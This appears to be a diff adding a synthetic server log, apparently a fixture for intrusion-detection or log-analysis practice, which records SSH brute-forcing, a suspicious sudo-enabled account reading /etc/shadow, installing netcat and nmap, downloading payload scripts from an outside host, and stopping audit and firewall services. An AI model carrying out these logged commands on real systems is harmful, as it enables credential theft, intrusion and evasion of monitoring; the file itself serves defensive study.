@@ -1,0 +1,54 @@
+Jun 20 08:00:01 server01 sshd[1001]: Accepted publickey for admin from 10.0.0.5 port 51234 ssh2
+
+Jun 20 08:05:12 server01 sshd[1002]: Failed password for invalid user administrator from 185.220.101.10 port 42111 ssh2
+Jun 20 08:05:14 server01 sshd[1003]: Failed password for invalid user administrator from 185.220.101.10 port 42112 ssh2
+Jun 20 08:05:16 server01 sshd[1004]: Failed password for invalid user administrator from 185.220.101.10 port 42113 ssh2
+Jun 20 08:05:18 server01 sshd[1005]: Failed password for invalid user administrator from 185.220.101.10 port 42114 ssh2
+Jun 20 08:05:20 server01 sshd[1006]: Failed password for invalid user administrator from 185.220.101.10 port 42115 ssh2
+
+Jun 20 08:10:01 server01 sshd[1010]: Failed password for root from 203.0.113.50 port 52201 ssh2
+Jun 20 08:10:04 server01 sshd[1011]: Failed password for root from 203.0.113.50 port 52202 ssh2
+Jun 20 08:10:07 server01 sshd[1012]: Failed password for root from 203.0.113.50 port 52203 ssh2
+Jun 20 08:10:11 server01 sshd[1013]: Accepted password for root from 203.0.113.50 port 52204 ssh2
+
+Jun 20 08:20:01 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt update
+
+Jun 20 08:20:22 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/apt upgrade
+
+Jun 20 08:30:01 server01 useradd[1100]: new user: name=backupsvc, UID=1003, GID=1003, home=/home/backupsvc, shell=/bin/bash
+
+Jun 20 08:31:15 server01 passwd[1101]: password changed for backupsvc
+
+Jun 20 08:40:01 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backupsvc
+
+Jun 20 08:45:01 server01 sudo:    admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/sbin/usermod -aG wheel backupsvc
+
+Jun 20 09:00:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+
+Jun 20 09:05:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd
+
+Jun 20 09:10:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/apt install netcat
+
+Jun 20 09:15:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/apt install nmap
+
+Jun 20 09:20:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.77/payload.sh
+
+Jun 20 09:25:01 server01 sudo:    backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.77/tool.sh
+
+Jun 20 09:30:01 server01 systemd[1]: Stopped auditd.service
+
+Jun 20 09:35:01 server01 systemd[1]: Stopped firewalld.service
+
+Jun 20 09:40:01 server01 systemd[1]: Started telnet.socket
+
+Jun 20 09:45:01 server01 userdel[1200]: delete user 'backupsvc'
+
+Jun 20 10:00:01 server01 sshd[1201]: Accepted publickey for admin from 10.0.0.8 port 53211 ssh2
+
+Jun 20 10:01:01 server01 systemd[1]: Started nginx.service
+
+Jun 20 10:02:01 server01 CRON[1300]: (root) CMD (/usr/local/bin/backup.sh)
+
+Jun 20 10:03:01 server01 kernel: IPv4: martian source 192.168.1.250 from 10.0.0.2
+
+Jun 20 10:04:01 server01 systemd[1]: Started backup.service
